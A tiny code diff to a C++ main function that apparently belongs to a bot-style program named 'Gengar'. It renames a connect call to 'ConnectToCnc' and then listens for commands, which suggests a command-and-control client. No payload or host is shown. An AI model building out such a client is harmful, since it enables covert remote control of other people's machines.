@@ -1,8 +1,9 @@
+#include <iostream>
 #include "gengar.h"
 
 int main()
 {
 	Gengar gengar;
-	gengar.Connect();
+	gengar.ConnectToCnc();
 	gengar.ListenForCommand();
 }
